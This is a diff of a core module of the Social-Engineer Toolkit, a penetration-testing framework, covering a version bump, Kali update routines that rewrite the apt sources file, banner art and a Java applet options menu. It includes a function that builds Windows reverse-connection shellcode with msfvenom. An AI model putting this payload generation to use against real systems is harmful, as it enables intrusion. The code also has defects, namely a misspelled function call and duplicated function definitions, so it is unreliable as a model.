@@ -229,7 +229,7 @@ def print_error(message):
     print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC
 
 def get_version():
-    define_version = '5.4.8'
+    define_version = '6.0'
     return define_version
 
 class create_menu:
@@ -399,27 +399,67 @@ def cleanup_routine():
     except:
         pass
 
-#
-# Update Metasploit
-#
-def update_metasploit():
-    print_info("Updating the Metasploit Framework...Be patient.")
-    msf_path = meta_path()
-    svn_update = subprocess.Popen("cd %s/;svn update" % (msf_path), shell=True).wait()
-    print_status("Metasploit has successfully updated!")
-    return_continue()
+# quick check to see if we are running kali-linux
+def check_kali():
+    if os.path.isfile("/etc/apt/sources.list"):
+        kali = file("/etc/apt/sources.list", "r")
+        kalidata = kali.read()
+        if "kali" in kalidata:
+            return "Kali"
+        # if we aren't running kali
+        else: return "Non-Kali"
+    else:
+        print "[!] Not running a Debian variant.."
+        return "Non-Kali"
+
+# checking if we have bleeding-edge enabled for updates
+def bleeding_edge():
+    # first check if we are actually using Kali
+    kali = check_kali()
+    if kali == "Kali":
+        print_status("Checking to see if bleeding-edge repos are active.")
+        # check if we have the repos enabled first
+        fileopen = file("/etc/apt/sources.list", "r")
+        kalidata = fileopen.read()
+        if "deb http://repo.kali.org/kali kali-bleeding-edge main" in kalidata:
+            print_status("Bleeding edge already active..Moving on..")
+            subprocess.Popen("apt-get update;apt-get upgrade -f -y --force-yes;apt-get dist-upgrade -f -y --force-yes;apt-get autoremove -f -y --force-yes", shell=True).wait()
+            return True
+        else:
+            print_status("Adding Kali bleeding edge to sources.list for updates.")
+            # we need to add repo to kali file
+            # we will rewrite the entire apt in case not all repos are there
+            filewrite = file("/etc/apt/sources.list", "w")
+            filewrite.write("# kali repos installed by TARDIS\ndeb http://http.kali.org/kali kali main non-free contrib\ndeb-src http://http.kali.org/kali kali main non-free contrib\n## Security updates\ndeb http://security.kali.org/kali-security kali/updates main contrib non-free\ndeb http://repo.kali.org/kali kali-bleeding-edge main")
+            filewrite.close()
+            print_status("Updating Kali now...")
+            subprocess.Popen("apt-get update;apt-get upgrade -f -y --force-yes;apt-get dist-upgrade -f -y --force-yes;apt-get autoremove -f -y --force-yes", shell=True).wait()
+            return True
+
+    else:
+        print "[!] Kali was not detected. Not adding bleeding edge repos."
+        return False
 
 #
 # Update The Social-Engineer Toolkit
 #
 def update_set():
-    print_info("Updating the Social-Engineer Toolkit, be patient...")
-    print_info("Performing cleanup first...")
-    subprocess.Popen("git clean -fd", shell=True).wait()
-    print_info("[*] Updating... This could take a little bit...")
-    subprocess.Popen("git pull", shell=True).wait()
-    print_status("The updating has finished, returning to main menu..")
-    time.sleep(2)
+    kali = check_kali()
+    if kali == "Kali":
+        print_status("You are running Kali Linux which maintains SET updates.")
+        print_status("You can enable bleeding-edge repos for up-to-date SET.")
+        time.sleep(2)
+        bleeding_edge()
+
+    else:
+        peinr_info("Kali-Linux not detected, manually updating..")
+        print_info("Updating the Social-Engineer Toolkit, be patient...")
+        print_info("Performing cleanup first...")
+        subprocess.Popen("git clean -fd", shell=True).wait()
+        print_info("Updating... This could take a little bit...")
+        subprocess.Popen("git pull", shell=True).wait()
+        print_status("The updating has finished, returning to main menu..")
+        time.sleep(2)
 
 #
 # Pull the help menu here
@@ -752,8 +792,8 @@ def show_banner(define_version,graphic):
     print bcolors.BLUE + """
 [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
 [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
-[---]                Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                    [---]
-[---]              Codename: '""" + bcolors.YELLOW + """Walkers""" + bcolors.BLUE + """'                 [---]
+[---]                 Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                     [---]
+[---]             Codename: '""" + bcolors.YELLOW + """Rebellion""" + bcolors.BLUE + """'                [---]
 [---]        Follow us on Twitter: """ + bcolors.PURPLE+ """@TrustedSec""" + bcolors.BLUE+"""         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE+ """@HackingDave""" + bcolors.BLUE+"""        [---]
 [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]
@@ -765,7 +805,7 @@ def show_banner(define_version,graphic):
     print bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n             Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC
 
 def show_graphic():
-    menu = random.randrange(2,11)
+    menu = random.randrange(2,12)
     if menu == 2:
         print bcolors.YELLOW + r"""
                  .--.  .--. .-----.
@@ -898,6 +938,31 @@ def show_graphic():
                      
                 https://www.trustedsec.com""" + bcolors.ENDC
 
+    if menu == 11:
+        print bcolors.backBlue + r"""
+                          _                                           J
+                         /-\                                          J
+                    _____|#|_____                                     J
+                   |_____________|                                    J
+                  |_______________|                                   E
+                 ||_POLICE_##_BOX_||                                  R
+                 | |-|-|-|||-|-|-| |                                  O
+                 | |-|-|-|||-|-|-| |                                  N
+                 | |_|_|_|||_|_|_| |                                  I
+                 | ||~~~| | |---|| |                                  M
+                 | ||~~~|!|!| O || |                                  O
+                 | ||~~~| |.|___|| |                                  O
+                 | ||---| | |---|| |                                  O
+                 | ||   | | |   || |                                  O
+                 | ||___| | |___|| |                                  !
+                 | ||---| | |---|| |                                  !
+                 | ||   | | |   || |                                  !
+                 | ||___| | |___|| |                                  !
+                 |-----------------|                                  !
+                 |   Timey Wimey   |                                  !
+                 -------------------                                  !""" + bcolors.ENDC
+
+
 #
 # identify if set interactive shells are disabled
 #
@@ -921,7 +986,7 @@ def menu_back():
 def custom_template():
     try:
         print ("         [****]  Custom Template Generator [****]\n")
-        print ("Always looking for new templates! In the set/src/templates directory send an email\n   to davek@secmaniac.com if you got a good template!")
+        print ("Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
         author=raw_input(setprompt("0", "Enter the name of the author"))
         filename=randomgen=random.randrange(1,99999999999999999999)
         filename=str(filename)+(".template")
@@ -1190,12 +1255,13 @@ def generate_shellcode(payload,ipaddr,port):
     msf_path = meta_path()
     # generate payload
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s -a x86 --platform windows -f c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
-    repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'buf=' : ''}
+    repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'unsigned char buf=' : '', 'unsignedcharbuf[]=' : ''}
     data = reduce(lambda a, kv: a.replace(*kv), repls.iteritems(), data).rstrip()
     # return data
+    print data
     return data
 
 # this will take input for shellcode and do a replace for IP addresses
@@ -1517,3 +1583,79 @@ def capture(func, *args, **kwargs):
     sys.stdout = stdout
     sys.stderr = stderr
     return (result, c1.getvalue(), c2.getvalue())
+
+
+def check_kali():
+    if os.path.isfile("/etc/apt/sources.list"):
+        kali = file("/etc/apt/sources.list", "r")
+        kalidata = kali.read()
+        if "kali" in kalidata:
+            return "Kali"
+        # if we aren't running kali
+        else: return "Non-Kali"
+    else:
+        print "[!] Not running a Debian variant.."
+        return "Non-Kali"
+
+# checking if we have bleeding-edge enabled for updates
+def bleeding_edge():
+    # first check if we are actually using Kali
+    kali = check_kali()
+    if kali == "Kali":
+        print "[*] Checking to see if bleeding-edge repos are active."
+        # check if we have the repos enabled first
+        fileopen = file("/etc/apt/sources.list", "r")
+        kalidata = fileopen.read()
+        if "deb http://repo.kali.org/kali kali-bleeding-edge main" in kalidata:
+            print "[*] Bleeding edge already active..Moving on.."
+            return True
+        else:
+            print "[!] Bleeding edge repos were not detected. This is recommended."
+            enable = raw_input("Do you want to enable bleeding-edge repos for fast updates [yes/no]: ")
+            if enable == "y" or enable == "yes":
+                print "[*] Adding Kali bleeding edge to sources.list for updates."
+                # we need to add repo to kali file
+                # we will rewrite the entire apt in case not all repos are there
+                filewrite = file("/etc/apt/sources.list", "w")
+                filewrite.write("# kali repos installed by TARDIS\ndeb http://http.kali.org/kali kali main non-free contrib\ndeb-src http://http.kali.org/kali kali main non-free contrib\n## Security updates\ndeb http://security.kali.org/kali-security kali/updates main contrib non-free\ndeb http://repo.kali.org/kali kali-bleeding-edge main")
+                filewrite.close()
+                print "[*] It is recommended to now run apt-get update && apt-get upgrade && apt-get dist-upgrade && apt-get autoremove and restart SET."
+                return True
+            else:
+                print "[:(] Your loss! Bleeding edge provides updates regularly to Metasploit, SET, and others!"
+
+# here we give multiple options to specify for SET java applet
+def applet_choice():
+    
+    # prompt here 
+    print """
+[-------------------------------------------]
+Java Applet Configuration Options Below
+[-------------------------------------------]
+
+Next we need to specify whether you will use your own self generated java applet, built in applet, or your own code signed java applet. In this section, you have all three options available. The first will create a self-signed certificate if you have the java jdk installed. The second option will use the one built into SET, and the third will allow you to import your own java applet OR code sign the one built into SET if you have a certificate.
+
+Select which option you want:
+
+1. Make my own self-signed certificate applet.
+2. Use the applet built into SET.
+3. I have my own code signing certificate or applet.\n"""
+
+    choice1 = raw_input("Enter the number you want to use [1-3]: ")
+
+    # use the default
+    if choice1 == "": choice1 = "2"
+
+    # make our own
+    if choice1 == "1":
+        try: import src.html.unsigned.self_sign
+        except: reload(src.html.unsigned.self_sign)
+
+    # if we need to use the built in applet
+    if choice1 == "2":
+        print_status("Okay! Using the one built into SET - be careful, self signed isn't accepted in newer versions of Java :(")
+
+    # if we want to build our own
+    if choice1 == "3":
+        try: import src.html.unsigned.verified_sign
+        except: reload(src.html.unsigned.verified_sign)
